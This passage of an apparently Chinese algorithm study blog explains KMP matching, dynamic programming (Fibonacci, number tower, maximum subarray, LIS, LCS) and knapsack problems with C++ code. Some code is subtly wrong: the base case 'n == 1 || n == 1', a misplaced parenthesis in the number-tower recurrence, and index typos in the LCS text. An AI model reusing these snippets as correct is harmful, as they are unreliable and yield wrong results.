class="number">1</span>])&#123;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">next[i] = j;  <span class="comment">//令 next[i] = j</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="kmp算法-2"><a class="markdownIt-Anchor" href="#kmp算法-2">#</a> KMP 算法</h4><p>在上文的基础，利用 next 数组即可进行 KMP 算法求解。这里也知晓了 next 数组的含义 ** 即当 j+1 位失配时，j 应该回退到的位置。由此总结除 KMP 算法的一般思路。</p><ul><li>①初始化 j = -1, 表示 pattern 当前已经被匹配的最后位。</li><li>②让 i 遍历文本串 text，对每一个 i，执行③④来试图匹配 text [i] 和 pattern [j + 1].</li><li>③不断令 j =next [j]，直到 j 回退为 -1，或者 text [i] == pattern [j + 1] 成立。</li><li>④如果 text [i] == pattern [j + 1], 则令 j++。如果 j 达到 m -1 ，则说明 pattern 是 text 的子串。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">KMP</span><span class="params">(<span class="type">char</span> text[], <span class="type">char</span> pattern[])</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n =<span class="built_in">strlen</span>(text), m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"><span class="built_in">getNext</span>(pattern,m);  <span class="comment">//计算pattern 的next 数组</span></span><br><span class="line"><span class="type">int</span> j=<span class="number">-1</span>;  <span class="comment">//初始化 j = -1 ，表示当前还没有任意一位被匹配</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; n; i++)&#123;   <span class="comment">//视图匹配text[i]</span></span><br><span class="line"><span class="keyword">while</span>(j != <span class="number">-1</span> &amp;&amp; text[i] != pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j = next[j];   <span class="comment">//不断回退，直到j 回到 -1 或者 text[i] == pattern[j+1]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(text[i] == pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j++;   <span class="comment">//text[i] 和pattern[j+1] 匹配成功</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == m <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码其实和求解 next 数组的代码惊人的相似。<strong>其实，求解 next 数组的过程就是模式串 pattern 进行自我匹配的过程。</strong><br>接着需要考虑 text 中 pattern 串出现的次数。这里考虑的主要是当 pattern 和 text 匹配完成之后，如何进行回退效率最高且不会遗漏解。这时还是利用 next 数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">KMP</span><span class="params">(<span class="type">char</span> text[], <span class="type">char</span> pattern[])</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n =<span class="built_in">strlen</span>(text), m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"><span class="built_in">getNext</span>(pattern,m);  <span class="comment">//计算pattern 的next 数组</span></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>,j =<span class="number">-1</span>;  <span class="comment">//初始化 j = -1 ，表示当前还没有任意一位被匹配</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; n; i++)&#123;   <span class="comment">//视图匹配text[i]</span></span><br><span class="line"><span class="keyword">while</span>(j != <span class="number">-1</span> &amp;&amp; text[i] != pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j = next[j];   <span class="comment">//不断回退，直到j 回到 -1 或者 text[i] == pattern[j+1]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(text[i] == pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j++;   <span class="comment">//text[i] 和pattern[j+1] 匹配成功</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == m <span class="number">-1</span> )&#123;</span><br><span class="line">ans++;</span><br><span class="line">j = next[j]; <span class="comment">//让j回退到next[j]继续进行匹配</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans; <span class="comment">//返回成功匹配次数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对上述的 KMP 算法还有优化空间，</p><h1 id="动态规划"><a class="markdownIt-Anchor" href="#动态规划">#</a> 动态规划</h1><p>【定义】DP 使用来解决一类<strong>最优化问题</strong>的算法思想。动态规划将一个复杂的问题分解成若干的子问题，通过综合子问题的最优解来得到原问题的最优解。需要注意的是，动态规划将每个求结果的子问题的解记录下来，这样当下一次碰到同样的子问题时，就可以直接使用之前的记录的结果，而不是重复计算。一般可以使用递归或者递推的写法来实现动态规划，其中递归写法在此处也可以称为<strong>记忆化搜索</strong>。</p><h2 id="动态规划的递归和递推写法"><a class="markdownIt-Anchor" href="#动态规划的递归和递推写法">#</a> 动态规划的递归和递推写法</h2><h4 id="动态规划的递归写法"><a class="markdownIt-Anchor" href="#动态规划的递归写法">#</a> 动态规划的递归写法</h4><p>这里拿斐波那契数列的计算进行举例，正常没有优化的求解如下，根据斐波那契额数列的定义直接写代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">F</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>|| n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">F</span>(n<span class="number">-1</span>) + <span class="built_in">F</span>(n<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里事实上会进行很多的重复计算，例如 n = 5 时，F (5) = F (4) + F (3)，但是在计算 F (4) 时对 F (3) 又进行了一次计算。为了<strong>避免重复计算</strong>，可以开一个一维的 dp 数组，用来保存计算过的结果，这便是记忆化（即记录计算过的数据以此来防止重复计算带来的时间复杂度)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dp[MAX_N]; <span class="comment">//这里可以初始化dp为 -1</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">F</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span> || n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(dp[n] != <span class="number">-1</span>) <span class="keyword">return</span> dp[n];</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">dp[n] = <span class="built_in">F</span>(n<span class="number">-1</span>) + <span class="built_in">F</span>(n<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以把计算结果记录下来，下次再需要使用时可以省去计算。<br>通过上面的例子可以引申出一个概念：如果一个问题可以被分解为若干个子问题，并且这些子问题会重复出现，那么就称这个问题拥有<strong>重叠子问题</strong>。动态规划通过记录重叠子问题的解，来使下次碰到相同的子问题时可以直接使用之前的记录的结果。</p><h4 id="动态规划的递推写法"><a class="markdownIt-Anchor" href="#动态规划的递推写法">#</a> 动态规划的递推写法</h4><p>用经典的数塔问题为例子。将一些数字排成数塔的形状，其中第一层右一个数字，第二层二个数字，… 第 n 层 n 个数字。现在要从第一层走到第 n 层，每次只能走向下一层连接的两个数字中的一个，需要知道：到达底层将路径上的所有数字相加后得到的和最大是多少。<br>按照题目的描述，如果卡一个二维数组 f,f [i][j] 存放第 i 层的第 j 个数字。如果尝试琼剧所有路径，然后记录路径上数字和的最大值，那么时间复杂度 O (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>)<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/suanfa_1.png?raw=true" alt="数塔"><br>一开始，从第一层的 5 出发，按照 5-&gt;8-&gt;7 的路线来到 7，并枚举从 7 出发的到达最底层的所有路径。但是，之后按 5-&gt;3-&gt;7 时，如果没有进行记录，又会去枚举 7 出发的到达最底层的所有路径，这就导致了从 7 出发的到达最底层的所有路径被反复的访问。<br>由上面的考虑，不妨令 dp [i][j] 表示从第 i 行第 j 个数字出发到达最底层的所有路径中能得到的最大和，例如 dp [3][2] 就是图中的 7 到达最底层的路径最大和。在定义这个数组之后，dp [1][1] 就是我们最终想要的答案。注意到一个细节：如果要求从位置 (1,1) 到达最底层的最大和 dp [1][1]，那么一定要先求出它的两个子问题 &quot; 从位置 (2,1) 到达最底层的最大和 dp [2][1]“和” 从位置 (2,2) 到达最底层的最大和 dp [2][2], 即进行了以此决策：走数字 5 的左下还是右下。写出式子就是： <code>dp[1][1]=max(dp[2][1],dp[2][2])+f[1][1]</code>  由此可以打的这么一个信息，如果要求出 dp [i][j]，那么一定要先求出它的两个子问题。即 <code>dp[i][j]=max(dp[i+1][j],dp[i+1][j+1])+f[i][j]</code> 。把 dp [i][j] 称为问题的<strong>状态</strong>，而把上面的式子称为<strong>状态转移方程</strong>。<br>下面根据这种思想写出动态规划的代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> f[maxn][maxn],dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;f[i][j]); <span class="comment">//输入数塔</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j&lt;= n;j++)&#123;</span><br><span class="line">dp[n][j] = f[n][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =n - <span class="number">1</span>; i &gt;- <span class="number">1</span>; i--)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>; j &lt;= i; j++)&#123;</span><br><span class="line">dp[i][j] = <span class="built_in">max</span>(dp[i + <span class="number">1</span>][j],dp[i+<span class="number">1</span>][j+<span class="number">1</span>]+f[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,dp[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然，使用递归也可以实现上面的例子 (即从 dp [1][1] 开始递归，直至到达边界时返回结果)。二者的区别在于：使用<strong>递推写法</strong>的计算方式是<strong>自底向上</strong>，即从边界开始，不断向上解决问题，直到解决了目标问题：而使用<strong>递归写法</strong>的计算方式是<strong>自顶向下</strong>，即从目标问题开始，将它分解成子问题的组合，直到分解到边界为止。通过上面的例子再引申一个概念：如果一个问题的最优解可以由其子问题的最优解有效地构造出来，那么称这个问题拥有<strong>最优子结构</strong>。最优子结构保证了动态规划中原问题的最优解可以由子问题的最优解推导而来。因此，一个问题必须拥有最优子结构，才能使用动态规划去解决。<strong>即，一个问题必须拥有重叠子问题和最优子结构，才能使用动态规划去解决</strong>。<br>①：分治和动态规划。分治和动态规划都是将问题分解为子问题，然后合并子问题的解得到原问题的解。但是不同的是，分治法分解出的子问题是不重叠的，因此分治法解决的问题不拥有重叠子问题，二动态规划解决的问题拥有重叠子问题。例如：归并排序和快速排序都是分别处理左序列和右序列，然后将左右序列的结果合并，过程中不出现重叠子问题，因此，它们使用的都是分治法。另外，分治法解决的问题不一定是最优化问题，而动态规划解决的问题是最优化问题。<br>②：贪心和动态规划。贪心和动态规划都要求原问题必须拥有最优子结构。二者的区别在于，贪心法采用的计算方式类似上面介绍的 “自顶向下”。但是并不等待子问题求解完毕后在选择使用哪一个，而是通过一种策略直接选择一个子问题去求解，没被选择的子问题就不去求解了，直接抛弃。也就是说，它总是在上一步选择的基础上继续选择，因此整个过程以一种单链的流水方式进行，</p><h4 id="最大连续子序列和"><a class="markdownIt-Anchor" href="#最大连续子序列和">#</a> 最大连续子序列和</h4><p>问题如下： 给定一个数字序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">A_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">A_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,…,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 求 i，j 使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>+…+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">A_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> 最大，输出这个最大的和。<br>这个问题可以用暴力，就是直接枚举左右端点 O (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>) 的复杂度，而计算 A [i] - A [j] 需要 O (n) 复杂度因此总复杂度较高。下面介绍动态规划的做法，复杂度仅为 O (n)。<br><strong>步骤 1：</strong> 令状态 dp [i] 表示以 A [i] 作为末尾的连续序列的最大和。以样例为例子：序列 - 2 11 -4 13 -5 -2, 下标分别记为 0,1,2,3,4,5, 那么：<br> <code>dp[0]=-2,dp[1]=11,dp[2]=7(11-4),dp[3]=20,dp[4]=15,dp[5]=13</code>  通过设置这么一个 dp 数组，要求的最大和其实就是 dp [0]–dp [n-1] 中的最大值。下面解释如何求解 dp 数组。<br><strong>步骤 2</strong>：作如下考虑：因为 dp [i] 要求是必须以 A [i] 结尾的连续序列，那么有两种情况：<br>①：这个最大和的连续序列只有一个元素，即以 A [i] 开始，A [i] 结尾。<br>②：这个最大和的连续序列有多个元素，即从前面某处 A [p] 开始 (p&lt;i), 一直到 A [i] 结尾。<br>第一种情况，最大和就是 A [i] 本身。<br>第二种情况，最大和是 dp [i-1]+A [i] 由此可以得到状态转移方程:<br><strong>dp[i] = max{A[i], dp[i-1] + A[i]}</strong></p><h4 id="最长不下降子序列"><a class="markdownIt-Anchor" href="#最长不下降子序列">#</a> 最长不下降子序列</h4><blockquote><p>在一个数字序列中，找到一个最长的子序列（可以不连续），使得这个子序列是不下降的。</p></blockquote><p>例如，现在有序列 A = {1,2,3,-1,-2,7,9}(下标从 1 开始)，它的最长不下降子序列是 {1,2,3,7,9}, 长度为 5. 另外，还有一些子序列是不下降子序列，比如 {1,2,3},{-2,7,9} 等，但都不是最长的。<br>其实这个问题很容易想到也可以直接暴力求解，直接对所有情况进行枚举，但是其复杂度显然很高。我们仍利用 dp [i] 数组来进行辅助记录。如果令 dp [i] 表示以 A [i] 结尾的最长不下降子序列长度。这样对 A [i] 来说就会有两种可能:<br>①：如果存在 A [i] 之前的元素 A [j](j&lt;i)，使得 A [j]&lt;=A [i] 且 dp [j]+1 &gt; dp [i]，那么就把 A [i] 跟在以 A [j] 结尾的 LIS 后面，形成一条更长的不下降子序列。<br>②：如果 A [i] 之前的元素都比 A [i] 大，那么 A [i] 就只好自己形成一条 LIX，但是长度为 1，即这个子序列里面只有一个 A [i]。<br>因此可以写出状态转移方程：   <strong>dp[i] = max{1,dp[j] + 1}</strong><br> 由此可以写出代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> A[N],dp[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">dp[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j &lt; i ;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(A[i] &gt;= A[j] &amp;&amp; (dp[j] + <span class="number">1</span> &gt; dp[i]))&#123;</span><br><span class="line">dp[i] = dp[j] +<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="built_in">max</span>(ans,dp[i]);</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="最长公共子序列-lcs"><a class="markdownIt-Anchor" href="#最长公共子序列-lcs">#</a> 最长公共子序列 （LCS）</h4><p>题目描述： 给定两个字符串 A 和 B，求一个字符串，使得这个字符串是 A 和 B 的最长公共部分（子序列可以不连续）<br>这里令 dp [i][j] 表示字符串 A 的 i 号位和字符串 B 的 j 号位之前的 LCS 长度，那么可以根据 A [i] 和 B [j] 的情况，分为两种决策：<br>①若 A [i] == B [j]，则字符串 A 和 字符串 B 的 LCS 增加了 1 位，即有 dp [i][j] = dp [i-1][j-1]+1。<br>②若 A [i] != B [i]，则字符串 A 的 i 号位和字符串 B 的 j 号位之前的 LCS 无法延长，因此 dp [i][j] 将会继承 dp [i-1][j] 与 dp [i][j] 中较大的值，即有 dp [i][j] = max {dp [i-1][j],dp [i][j-1]}。</p><h2 id="背包问题"><a class="markdownIt-Anchor" href="#背包问题">#</a> 背包问题</h2><p>背包问题是一类很经典的动态规划问题，这里先介绍两个最简单的背包问题：0-1 背包问题和完全背包问题。</p><h4 id="01背包问题"><a class="markdownIt-Anchor" href="#01背包问题">#</a> 01 背包问题</h4><blockquote><p>题目描述：有 n 件物品，每件物品的重量为 w [i]，价值为 c [i]。现有一个容量为 V 的背包，问如何选取物品放入背包，使得背包内物品的总价值最大。其中每种物品都只有 1 件。</p></blockquote><p>这里引入 dp [i][v] 表示前 i 件物品恰好装入容量为 v 的背包中所获得的最大值。下面介绍如何求解 dp 数组。<br>考虑对第 i 件物品有两种选择策略：<br>①不放第 i 件物品，那么问题转化为前 i-1 件物品恰好装入容量为 v 的背包中所能获得的最大价值，也即 dp [i-1][v]。<br>②放第 i 件物品，那么问题转化为前 i-1 件物品恰好装入容量 v-w [i] 的背包中所能获得的最大价值，也即 dp [i-1][v-w [i]]+c [i]。<br>由上述两种策略，且要获得最大价值，有下面状态转移方程<strong> dp [i][v] = max {dp [i-1][v],dp [i-1][v-w [i]]+c [i]}</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = w[i]; v&lt;= V;v++)&#123;</span><br><span class="line">dp[i][v] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][v],dp[i<span class="number">-1</span>][v-w[i]]+c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，可以对空间进行优化，可以将其化简为<strong> dp [v] = max (dp [v],dp [v-w [i]]+c [i])。</strong> 不过这样写需要更改循环代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = V; v&gt;=w[i];v--)&#123;</span><br><span class="line">dp[v] = <span class="built_in">max</span>(dp[v],dp[v-w[i]]+c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完全背包问题"><a class="markdownIt-Anchor" href="#完全背包问题">#</a> 完全背包问题</h4><blockquote><p>描述如下：有 n 种物品，每种物品的重量为 w [i]，价值为 c [i]。现有一个容量为 V 的背包，问如何选取物品放入背包，使得背包内物品的总价值最大。每种物品都有无穷件。</p></blockquote><p>可以看出，完全背包问题和 01 背包问题唯一的区别就在于：完全背包的物品数量每种有无穷件，选取物品时对每一件物品可以取多件。同样令 dp [i][v] 表示前 i 件物品恰好放入容量为 v 的背包中能获得的最大价值。对第 i 件物品来说：<br>①不放第 i 件物品，那么 dp [i][v]=dp [i-1][v]，这跟 01 背包是一样的。<br>②放第 i 件物品。这里的处理和 01 背包有所不同，因为 01 背包的每个物品只能选择一个，因此选择放第 i 件物品就意味着必须转移到 dp [i-1][v-w [i]] 这个状态；但是完全背包不同，完全背包如果选择放第 i 件物品之后并不是转移到 dp [i-1][v-w [i]]，而是转移到 dp [i][v-w [i]] 这个状态，因为每件物品都可以放任意件，放了第 i 件物品之后还可以继续放第 i 件物品，直到第二维的 v-w [i] 无法保持大于等于 0 为止。<br>由上面的分析可以写出状态转移方程： <code>dp[i][v] = max(dp[i-1][v],dp[i][v-w[i]]+c[i])</code> 。<br>写成一维形式之后和 01 背包完全相同，唯一的区别是这里的 v 的枚举顺序是<strong>正向枚举</strong>，而 01 背包的一维形式中必须 v 是逆向枚举。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span 